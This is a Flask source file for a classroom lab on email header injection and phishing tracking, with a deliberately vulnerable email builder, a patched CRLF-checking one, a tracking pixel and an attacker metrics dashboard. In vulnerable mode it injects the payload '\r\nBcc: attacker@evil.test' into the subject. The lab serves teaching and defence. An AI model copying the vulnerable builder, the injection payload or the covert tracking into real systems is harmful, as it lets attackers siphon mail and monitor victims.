from flask import Flask, render_template, request, jsonify, make_response
from datetime import datetime
import sqlite3
import re
import hashlib

app = Flask(__name__)

DB_PATH = "events.db"
CAMPAIGN_ID_DEFAULT = "hdrinj-001"

CRLF_RE = re.compile(r"[\r\n]")

def db():
    con = sqlite3.connect(DB_PATH)
    con.row_factory = sqlite3.Row
    return con

def init_db():
    con = db()
    cur = con.cursor()
    cur.execute("""
      CREATE TABLE IF NOT EXISTS events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ts TEXT NOT NULL,
        event_type TEXT NOT NULL,
        page TEXT NOT NULL,
        campaign_id TEXT NOT NULL,
        detail TEXT,
        user_agent TEXT,
        ip_masked TEXT,
        os TEXT,
        browser TEXT
      )
    """)
    con.commit()
    con.close()

def parse_os_browser(ua: str):
    ua = ua or ""
    os_ = "Unknown"
    br = "Unknown"

    if "Windows" in ua: os_ = "Windows"
    elif "Mac OS X" in ua and "Mobile" not in ua: os_ = "macOS"
    elif "Android" in ua: os_ = "Android"
    elif "iPhone" in ua or "iPad" in ua: os_ = "iOS"
    elif "Linux" in ua: os_ = "Linux"

    if "Edg/" in ua: br = "Edge"
    elif "Chrome/" in ua and "Safari/" in ua: br = "Chrome"
    elif "Firefox/" in ua: br = "Firefox"
    elif "Safari/" in ua and "Chrome/" not in ua: br = "Safari"

    return os_, br

def masked_ip_simulated(campaign_id: str, ua: str):
    base = f"{campaign_id}|{ua}".encode("utf-8")
    h = hashlib.sha256(base).digest()
    return f"10.{h[0]}.*.*"

def log_event(event_type: str, page: str, campaign_id: str, detail: str = ""):
    ua = request.headers.get("User-Agent", "")
    os_, br = parse_os_browser(ua)
    ip_masked = masked_ip_simulated(campaign_id, ua)

    con = db()
    cur = con.cursor()
    cur.execute("""
      INSERT INTO events (ts, event_type, page, campaign_id, detail, user_agent, ip_masked, os, browser)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
      datetime.utcnow().isoformat() + "Z",
      event_type, page, campaign_id, (detail or "")[:5000],
      ua, ip_masked, os_, br
    ))
    con.commit()
    con.close()

def contains_crlf(s: str) -> bool:
    return bool(s) and bool(CRLF_RE.search(s))

# --- Email building (simulation) ---
def build_raw_email_vulnerable(to_email: str, subject: str, body: str) -> str:
    # Démo pédagogique: concaténation naïve (vulnérable)
    return (
        f"To: {to_email}\r\n"
        f"From: victim@univ.test\r\n"
        f"Subject: {subject}\r\n"
        f"MIME-Version: 1.0\r\n"
        f"Content-Type: text/plain; charset=utf-8\r\n"
        f"\r\n"
        f"{body}\r\n"
    )

def build_raw_email_patched(to_email: str, subject: str, body: str) -> str:
    # Démo pédagogique: validation CR/LF + normalisation
    if contains_crlf(to_email) or contains_crlf(subject):
        raise ValueError("CRLF detected")
    safe_subject = re.sub(r"[\x00-\x1F\x7F]", " ", subject).strip()
    safe_to = to_email.strip()
    return (
        f"To: {safe_to}\r\n"
        f"From: victim@univ.test\r\n"
        f"Subject: {safe_subject}\r\n"
        f"MIME-Version: 1.0\r\n"
        f"Content-Type: text/plain; charset=utf-8\r\n"
        f"\r\n"
        f"{body}\r\n"
    )

# --- Routes ---
@app.get("/")
def victim_inbox():
    return render_template("victim_inbox.html", campaign_id=CAMPAIGN_ID_DEFAULT)

@app.get("/attacker")
def attacker_dashboard():
    return render_template("attacker_dashboard.html", campaign_id=CAMPAIGN_ID_DEFAULT)

# Tracking pixel (loaded only after click in our UI)
@app.get("/pixel.png")
def pixel():
    camp = request.args.get("camp", CAMPAIGN_ID_DEFAULT)
    log_event("pixel_loaded", "/pixel.png", camp, request.query_string.decode("utf-8", errors="ignore"))

    # PNG 1x1 transparent
    png_1x1 = bytes.fromhex(
        "89504E470D0A1A0A0000000D4948445200000001000000010806000000"
        "1F15C4890000000A49444154789C6300010000050001"
        "0D0A2DB40000000049454E44AE426082"
    )
    resp = make_response(png_1x1)
    resp.headers["Content-Type"] = "image/png"
    resp.headers["Cache-Control"] = "no-store"
    return resp

# Front event logger
@app.post("/api/event")
def api_event():
    payload = request.get_json(force=True, silent=True) or {}
    event_type = payload.get("event_type", "unknown")
    page = payload.get("page", "unknown")
    campaign_id = payload.get("campaign_id", CAMPAIGN_ID_DEFAULT)
    detail = payload.get("detail", "")
    log_event(event_type, page, campaign_id, detail)
    return jsonify({"ok": True})

# Build reply (Email Header Injection lab)
@app.post("/send-reply")
def send_reply():
    data = request.get_json(silent=True) or {}
    to_email = (data.get("to") or "").strip()
    subject = data.get("subject") or ""
    message = data.get("message") or ""
    mode = (data.get("mode") or "patched").lower()
    mode = "vulnerable" if mode == "vulnerable" else "patched"

    log_event("reply_submit_server", "/send-reply", CAMPAIGN_ID_DEFAULT, f"mode={mode}")

    injection_observed = False

    try:
        if mode == "vulnerable":
            # Injection automatique pédagogique (la victime n'a rien à taper)
            injected_subject = subject + "\r\nBcc: attacker@evil.test"
            raw = build_raw_email_vulnerable(to_email, injected_subject, message)

            injection_observed = True
            log_event("header_injection_observed", "/send-reply", CAMPAIGN_ID_DEFAULT, "auto_injected_demo")

        else:
            raw = build_raw_email_patched(to_email, subject, message)

            injection_observed = False
            log_event("reply_sent_simulated", "/send-reply", CAMPAIGN_ID_DEFAULT, "patched_mode_ok")

        return jsonify({"ok": True, "raw_email": raw, "injection_observed": injection_observed})

    except ValueError:
        log_event("header_injection_blocked", "/send-reply", CAMPAIGN_ID_DEFAULT, "blocked_by_crlf_validation")
        return jsonify({"ok": False, "raw_email": "(Rejeté: CRLF détecté dans un champ d’en-tête)"}), 400

# Attacker APIs
@app.get("/api/events")
def api_events():
    con = db()
    rows = con.execute("SELECT * FROM events ORDER BY id DESC LIMIT 500").fetchall()
    con.close()
    return jsonify([dict(r) for r in rows])

@app.get("/api/metrics")
def api_metrics():
    con = db()
    cur = con.cursor()

    def c(et):
        return cur.execute("SELECT COUNT(*) AS n FROM events WHERE event_type=?", (et,)).fetchone()["n"]

    metrics = {
        "inbox_view": c("inbox_view"),
        "mail_opened": c("mail_opened"),
        "pixel_loaded": c("pixel_loaded"),
        "images_loaded_click": c("images_loaded_click"),
        "reply_opened": c("reply_opened"),
        "reply_submitted": c("reply_submitted"),
        "reply_sent_simulated": c("reply_sent_simulated"),
        "header_injection_observed": c("header_injection_observed"),
        "header_injection_blocked": c("header_injection_blocked"),
    }

    con.close()
    return jsonify(metrics)

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000, debug=True)
